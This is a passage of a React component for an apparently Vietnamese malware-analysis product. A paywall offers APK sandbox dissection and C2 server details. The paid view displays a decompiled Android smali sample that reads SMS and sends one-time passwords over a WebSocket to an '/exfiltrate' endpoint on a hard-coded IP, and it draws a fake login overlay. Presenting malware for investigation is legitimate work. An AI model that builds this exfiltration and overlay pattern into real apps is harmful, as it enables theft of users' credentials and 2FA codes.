                    <code>{`invoke-virtual {v0}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;
const-string v1, "103.145.22.89:8443/exfiltrate"
invoke-static {v1, v2}, Lcom/stealer/Payload;->sendOtpWebSocket(Ljava/lang/String;Ljava/lang/String;)V
invoke-virtual {p0}, Lcom/stealer/OverlayService;->drawFakeLoginScreen()V`}</code>
                  </pre>
                </div>
              </div>
            ) : (
              /* Paywall Preview for Free Users */
              <div className="bg-slate-900/90 border border-amber-500/40 rounded-2xl p-6 text-center space-y-4 relative overflow-hidden">
                <div className="max-w-md mx-auto space-y-2">
                  <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
                    <Lock className="w-6 h-6" />
                  </div>
                  <h5 className="font-bold text-white text-base">
                    Mở Khóa Giải Phẫu Sandbox Mã Độc .APK & Tọa Độ C2 Server
                  </h5>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Tính năng dành riêng cho Chuyên viên An ninh mạng, Điều tra viên và Người cần bằng chứng số để xử lý pháp lý.
                  </p>
                  <div className="pt-2">
                    <button
                      onClick={onOpenLicense}
                      className="bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-black px-6 py-2.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 cursor-pointer inline-flex items-center gap-2"
                    >
                      <Crown className="w-4 h-4" />
                      <span>Kích Hoạt Bản Quyền Pro Ngay</span>
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
